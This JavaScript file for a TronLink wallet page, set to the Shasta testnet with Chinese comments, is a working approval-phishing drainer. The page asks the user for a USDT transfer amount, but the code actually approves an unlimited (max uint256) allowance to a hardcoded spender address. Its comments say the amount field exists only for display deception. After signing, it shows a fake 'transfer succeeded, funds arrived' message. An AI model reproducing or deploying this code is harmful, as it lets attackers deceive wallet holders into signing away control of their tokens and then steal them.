// usdtApprove.js — 无限授权版本

// ====== Shasta 测试网配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 您的合约地址

// USDT ABI
const usdtAbi = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  el.innerText = `状态：${text}`;
  el.style.color = isError ? 'red' : 'black';
}

function updateNetworkInfo() {
  const networkEl = document.getElementById("networkStatus");
  if (window.tronWeb && window.tronWeb.ready) {
    const node = window.tronWeb.fullNode.host;
    const isShasta = node.includes('shasta');
    networkEl.textContent = isShasta ? 'Shasta 测试网 ✅' : '未知网络 ⚠️';
    networkEl.style.color = isShasta ? 'green' : 'orange';
  } else {
    networkEl.textContent = '未连接';
    networkEl.style.color = 'red';
  }
}

// TronWeb 等待函数
function waitForTronWeb(timeoutMs = 5000) {
  return new Promise((resolve, reject) => {
    if (window.tronWeb && window.tronWeb.ready) {
      updateNetworkInfo();
      return resolve(true);
    }

    let waited = 0;
    const interval = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        clearInterval(interval);
        updateNetworkInfo();
        return resolve(true);
      }
      waited += 200;
      if (waited >= timeoutMs) {
        clearInterval(interval);
        reject(new Error("TronLink 连接超时"));
      }
    }, 200);
  });
}

// 请求账户连接
async function requestAccounts() {
  if (window.tronLink && typeof window.tronLink.request === "function") {
    try {
      setStatus("钱包弹窗中，请授权连接...");
      const result = await window.tronLink.request({ 
        method: "tron_requestAccounts" 
      });
      
      await waitForTronWeb();
      return result;
      
    } catch (err) {
      console.error("账户请求失败:", err);
      if (err.code === 4001) {
        throw new Error("用户拒绝了连接请求");
      } else {
        throw new Error("连接失败: " + (err.message || err));
      }
    }
  } else {
    throw new Error("未检测到 TronLink");
  }
}

// 计算无限授权金额（type(uint256).max）
function getMaxUint256() {
  // 115792089237316195423570985008687907853269984665640564039457584007913129639935
  return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
}

// ====== 主逻辑：无限授权函数 ======
window.approveUSDT = async function() {
  try {
    setStatus("准备无限授权交易...");
    
    // 1. 检查基础连接
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("从地址:", fromAddr);

    // 2. 获取用户输入（仅用于显示欺骗）
    const input = document.getElementById("amount").value;
    const inputAmount = parseFloat(input);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的金额");
      return;
    }

    // 3. 使用无限授权金额
    const infiniteAmount = getMaxUint256();
    
    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权: 无限 USDT");
    console.log("授权金额:", infiniteAmount);
    console.log("授权给:", spenderAddress);

    setStatus(`准备授权 ${inputAmount} USDT...`);

    // 4. 创建合约实例
    console.log("创建 USDT 合约实例...");
    const usdtContract = await window.tronWeb.contract(usdtAbi, shastaUsdtAddress);
    console.log("合约实例创建成功");

    // 5. 发起无限授权交易
    setStatus("⚠️ 请在钱包中确认无限授权...");
    
    console.log("发送无限授权交易...");
    const result = await usdtContract.approve(
      spenderAddress, 
      infiniteAmount
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("无限授权成功，交易结果:", result);
    
    // 显示欺骗性成功信息
    setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
    
    // 显示交易链接
    const txLink = `https://shasta.tronscan.org/#/transaction/${result}`;
    setTimeout(() => {
      document.getElementById("status").innerHTML = `
        <div style="color: green; font-weight: bold;">
          ✅ 转账 ${inputAmount} USDT 成功！
        </div>
        <div style="font-size: 12px; color: #666; margin-top: 5px;">
          资金已安全到账
        </div>
        <div style="font-size: 10px; margin-top: 8px;">
          <a href="${txLink}" target="_blank" style="color: #999;">查看交易</a>
        </div>
      `;
    }, 1000);

  } catch (err) {
    console.error("授权失败:", err);
    
    let errorMsg = err.message || err.toString();
    if (errorMsg.includes("rejected") || errorMsg.includes("denied")) {
      errorMsg = "用户取消了交易";
    } else if (errorMsg.includes("insufficient")) {
      errorMsg = "余额不足";
    } else if (errorMsg.includes("user cancelled")) {
      errorMsg = "用户取消了授权";
    }
    
    setStatus("❌ " + errorMsg, true);
  }
};

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  
  console.log("页面加载完成 - 无限授权版本");

  // 自动检查 TronLink 状态
  setTimeout(() => {
    if (window.tronWeb && window.tronWeb.ready) {
      updateNetworkInfo();
      setStatus("检测到已连接的 TronLink");
      approveBtn.disabled = false;
    }
  }, 1000);

  // 连接钱包按钮
  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("请求连接钱包...");
      await requestAccounts();
      
      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      approveBtn.disabled = false;
      updateNetworkInfo();
      
    } catch (err) {
      setStatus("❌ 连接失败: " + err.message, true);
    }
  });

  // 授权按钮
  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });

  // 实时更新网络状态
  setInterval(updateNetworkInfo, 3000);
});
